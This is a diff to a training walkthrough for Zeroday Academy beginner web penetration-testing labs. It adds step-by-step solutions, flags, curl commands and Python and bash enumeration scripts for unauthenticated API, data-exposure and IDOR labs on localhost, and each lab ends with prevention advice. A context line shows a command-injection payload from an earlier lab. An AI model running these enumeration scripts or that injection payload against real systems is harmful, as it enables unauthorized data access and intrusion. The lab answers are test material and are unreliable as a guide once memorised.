@@ -1,6 +1,6 @@
 # Zeroday Academy - Beginner Labs Walkthrough
 
-**Complete step-by-step solutions for all 8 beginner web penetration testing labs**
+**Complete step-by-step solutions for all 11 beginner web penetration testing labs**
 
 ---
 
@@ -14,6 +14,9 @@
 6. [Broken Access Control](#6-broken-access-control)
 7. [Security Misconfiguration](#7-security-misconfiguration)
 8. [Command Injection](#8-command-injection)
+9. [Unauthenticated API Endpoints](#9-unauthenticated-api-endpoints)
+10. [Sensitive Data in API Responses](#10-sensitive-data-in-api-responses)
+11. [Predictable IDs & IDOR](#11-predictable-ids--idor)
 
 ---
 
@@ -806,6 +809,394 @@ curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; python
 3. Implement strict input validation and sanitization
 4. Use whitelist approach for allowed commands and parameters
 5. Run applications with minimal privileges (principle of least privilege)
+
+---
+
+## 9. Unauthenticated API Endpoints
+
+### Vulnerability Description
+Unauthenticated API endpoints are one of the most common API security vulnerabilities. APIs that fail to properly implement authentication allow attackers to access sensitive data and functionality without valid credentials.
+
+### Lab URL
+`http://localhost:5000/api/vuln/api-unauth`
+
+### Impact
+- Unauthorized access to sensitive data
+- Access to admin functionality
+- Data exfiltration
+- Internal API exposure
+- Complete API compromise
+
+### Solution Steps
+
+#### Step 1: Discover Basic API Endpoint
+**Objective:** Test the basic endpoint without parameters
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-unauth"
+```
+
+**Using Burp Suite:**
+1. Configure browser proxy to 127.0.0.1:8080
+2. Navigate to `http://localhost:5000/api/vuln/api-unauth`
+3. Observe the API response in Burp's Proxy tab
+4. Send to Repeater for manual testing
+
+**Expected Response:** Instructions and available actions
+**Explanation:** Understand the API structure and available endpoints before exploitation.
+
+#### Step 2: Access User Data Endpoint
+**Objective:** Access user data without authentication
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-unauth?action=users"
+```
+
+**Using Burp Suite:**
+1. In Repeater, modify the URL to add `?action=users`
+2. Click "Send" and observe the response
+3. Notice the exposed user data without authentication
+
+**Flag:** `FLAG{api_unauth_users_exposed}`
+**Explanation:** The API returns user data including emails and roles without requiring any authentication.
+
+#### Step 3: Access Admin Panel
+**Objective:** Access admin functionality without credentials
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-unauth?action=admin"
+```
+
+**Using Burp Suite:**
+1. Modify the `action` parameter to `admin`
+2. Send the request
+3. Observe admin privileges and secret keys in response
+
+**Flag:** `FLAG{unauth_admin_access_2024}`
+**Response includes:**
+- Admin panel access
+- User privileges (delete_users, modify_roles, access_logs)
+- Secret keys (API key, database password)
+
+**Explanation:** Critical vulnerability - admin functionality accessible without authentication!
+
+#### Step 4: Access Debug Endpoint
+**Objective:** Find debug/development endpoints
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-unauth?action=debug"
+```
+
+**Flag:** `FLAG{debug_endpoint_exposed}`
+**Explanation:** Debug endpoints often expose sensitive system information including file paths, environment details, and configuration.
+
+#### Step 5: Access Secret Data
+**Objective:** Find hidden secret endpoints
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-unauth?action=secret"
+```
+
+**Flag:** `FLAG{api_secret_data_leak}`
+**Explanation:** Secret endpoints may contain API tokens, encryption keys, and database credentials.
+
+### Prevention Measures
+1. Implement authentication on all API endpoints
+2. Use API keys, OAuth 2.0, or JWT tokens
+3. Never expose admin functionality without proper authorization
+4. Remove debug endpoints from production
+5. Use API rate limiting and monitoring
+6. Implement least privilege access control
+
+---
+
+## 10. Sensitive Data in API Responses
+
+### Vulnerability Description
+APIs that return overly verbose responses can leak sensitive information such as internal IDs, server paths, database credentials, and configuration details that should never be exposed to clients.
+
+### Lab URL
+`http://localhost:5000/api/vuln/api-sensitive-data`
+
+### Impact
+- Credential leakage
+- Internal system information exposure
+- Configuration data exposure
+- Increased attack surface
+- Privacy violations
+
+### Solution Steps
+
+#### Step 1: Access Profile Endpoint
+**Objective:** Identify excessive data in API responses
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-sensitive-data?endpoint=profile"
+```
+
+**Using Burp Suite:**
+1. Send request to `/api/vuln/api-sensitive-data?endpoint=profile`
+2. Examine the JSON response carefully
+3. Look for unnecessary sensitive fields
+
+**Flag:** `FLAG{api_profile_data_leak}`
+**Exposed data includes:**
+- Internal user ID
+- Password hash (should never be sent to client!)
+- Social security number
+- Account creation date
+- Last login IP
+- Email verification token
+
+**Explanation:** API returns far more data than necessary, including password hashes and SSN.
+
+#### Step 2: Trigger Verbose Error Messages
+**Objective:** Extract information from detailed error messages
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-sensitive-data?endpoint=error"
+```
+
+**Flag:** `FLAG{verbose_error_messages}`
+**Exposed information:**
+- Full database query with syntax
+- Internal file paths (`/app/server/database.js`)
+- Database table names and structure
+- Stack trace revealing code structure
+
+**Explanation:** Verbose error messages reveal internal implementation details useful for attackers.
+
+#### Step 3: Access Configuration Endpoint
+**Objective:** Extract sensitive configuration data
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-sensitive-data?endpoint=config"
+```
+
+**Flag:** `FLAG{config_exposure_critical}`
+**Exposed configuration:**
+- Database connection string with credentials
+- API keys for third-party services (AWS, Stripe, SendGrid)
+- Secret encryption keys
+- Admin email and credentials
+- Debug mode status
+
+**Explanation:** Configuration endpoints should never be publicly accessible - they contain critical secrets.
+
+### Automation Script
+**Python script to extract all sensitive data:**
+```python
+import requests
+import json
+
+base_url = "http://localhost:5000/api/vuln/api-sensitive-data"
+endpoints = ["profile", "error", "config"]
+
+for endpoint in endpoints:
+    response = requests.get(f"{base_url}?endpoint={endpoint}")
+    data = response.json()
+    print(f"\n=== {endpoint.upper()} ENDPOINT ===")
+    print(json.dumps(data, indent=2))
+    if 'flag' in data:
+        print(f"\n🚩 FLAG: {data['flag']}")
+```
+
+### Prevention Measures
+1. Return only necessary data in API responses
+2. Never include passwords, tokens, or hashes in responses
+3. Implement data minimization principles
+4. Use generic error messages in production
+5. Remove stack traces and debug info from production
+6. Separate internal/external API response schemas
+7. Use DTO (Data Transfer Objects) pattern
+
+---
+
+## 11. Predictable IDs & IDOR
+
+### Vulnerability Description
+Insecure Direct Object Reference (IDOR) vulnerabilities occur when applications use predictable identifiers (sequential IDs) to access resources without proper authorization checks. Attackers can enumerate and access unauthorized data by manipulating ID parameters.
+
+### Lab URL
+`http://localhost:5000/api/vuln/api-predictable-ids`
+
+### Impact
+- Unauthorized access to other users' data
+- Privacy violations
+- Data exfiltration
+- Access to confidential documents
+- Complete data breach via enumeration
+
+### Solution Steps
+
+#### Step 1: Access Your Own Profile
+**Objective:** Understand normal authorized access
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-predictable-ids?userId=1001"
+```
+
+**Using Burp Suite:**
+1. Send GET request with `userId=1001` parameter
+2. Observe your own user profile data
+3. Note the sequential ID pattern
+4. Send to Intruder for automated testing
+
+**Expected Response:** Your profile data (John Doe)
+**Explanation:** Establish baseline for normal authorized access.
+
+#### Step 2: Access Another User's Profile (IDOR)
+**Objective:** Access unauthorized user data by changing ID
+
+**Using curl:**
+```bash
+curl "http://localhost:5000/api/vuln/api-predictable-ids?userId=1002"
+```
+
+**Using Burp Suite:**
+1. In Repeater, change `userId` from `1001` to `1002`
+2. Click "Send"
+3. Observe unauthorized access to Jane Smith's profile
+
+**Flag:** `FLAG{idor_user_profile_access}`
+**Explanation:** Sequential IDs allow easy enumeration and unauthorized access to other users' data.
+
+#### Step 3: Enumerate All Users
+**Objective:** Automate user enumeration using Burp Intruder
+
+**Using Burp Suite Intruder:**
+1. Send request to Intruder (Ctrl+I)
+2. Set attack type to "Sniper"
+3. Add payload position: `userId=§1001§`
+4. Payloads tab → Payload type: Numbers
+5. Set range: 1001-1010 (sequential)
+6. Start attack
+7. Examine all responses for different user data
+
+**Using bash script:**
+```bash
+for id in {1001..1010}; do
+  echo "Testing User ID: $id"
+  curl "http://localhost:5000/api/vuln/api-predictable-ids?userId=$id"
+  echo "\n---"
+done
+```
+
+**Explanation:** Predictable IDs make it trivial to enumerate all users in the system.
+
+#### Step 4: Access Invoice Data
+**Objective:** Access other users' financial documents
+
+**Using curl:**
+```bash
+# Access your invoice
+curl "http://localhost:5000/api/vuln/api-predictable-ids?invoiceId=5001"
+
+# Access another user's invoice (IDOR)
+curl "http://localhost:5000/api/vuln/api-predictable-ids?invoiceId=5002"
+```
+
+**Flag:** `FLAG{idor_invoice_access}`
+**Exposed data:**
+- Invoice amounts ($50,000 contract)
+- Customer details
+- Payment information
+- Billing addresses
+
+**Explanation:** Financial documents accessible by simply incrementing invoice IDs.
+
+#### Step 5: Access Confidential Documents
+**Objective:** Access highly restricted documents
+
+**Using curl:**
+```bash
+# Public document
+curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9001"
+
+# Salary report (CONFIDENTIAL)
+curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9002"
+
+# Company financials
+curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9003"
+
+# API keys backup
+curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9004"
+
+# Database dump
+curl "http://localhost:5000/api/vuln/api-predictable-ids?docId=9005"
+```
+
+**Flags:**
+- Document 9002: `FLAG{idor_confidential_doc}` - Salary Report with executive compensation
+- Document 9004: `FLAG{idor_master_flag}` - API Keys (AWS, Stripe)
+- Document 9005: `FLAG{idor_database_dump}` - Customer Database (10M records)
+
+**Explanation:** Most sensitive documents accessible without authorization!
+
+### Automation Script
+**Python script to enumerate all resources:**
+```python
+import requests
+
+base_url = "http://localhost:5000/api/vuln/api-predictable-ids"
+
+print("=== USER ENUMERATION ===")
+for user_id in range(1001, 1011):
+    response = requests.get(f"{base_url}?userId={user_id}")
+    data = response.json()
+    if data.get('success'):
+        user = data.get('user', {})
+        print(f"User {user_id}: {user.get('name')} - {user.get('email')}")
+
+print("\n=== INVOICE ENUMERATION ===")
+for invoice_id in range(5001, 5006):
+    response = requests.get(f"{base_url}?invoiceId={invoice_id}")
+    data = response.json()
+    if data.get('success'):
+        invoice = data.get('invoice', {})
+        print(f"Invoice {invoice_id}: ${invoice.get('amount')} - {invoice.get('customerName')}")
+
+print("\n=== DOCUMENT ENUMERATION ===")
+for doc_id in range(9001, 9006):
+    response = requests.get(f"{base_url}?docId={doc_id}")
+    data = response.json()
+    if data.get('success'):
+        doc = data.get('document', {})
+        print(f"Document {doc_id}: {doc.get('title')} - {doc.get('content')}")
+        if 'flag' in doc:
+            print(f"  🚩 FLAG: {doc['flag']}")
+```
+
+### Prevention Measures
+1. **Use UUIDs** instead of sequential integers
+2. **Implement authorization checks** - verify user owns the resource
+3. **Use indirect references** - map user session to allowed resources
+4. **Implement access control lists (ACLs)**
+5. **Log and monitor access patterns** - detect enumeration attempts
+6. **Rate limit API requests** - slow down automated scanning
+7. **Use hash-based IDs** - `sha256(id + secret)` for public references
+
+**Example secure implementation:**
+```javascript
+// BAD - Sequential ID
+GET /api/invoices/5001
+
+// GOOD - UUID
+GET /api/invoices/f47ac10b-58cc-4372-a567-0e02b2c3d479
+
+// BETTER - Hash-based reference with authorization check
+GET /api/invoices/8f3d7e2a9b1c
+// Server verifies: user owns this invoice before returning data
+```
 
 ---
 
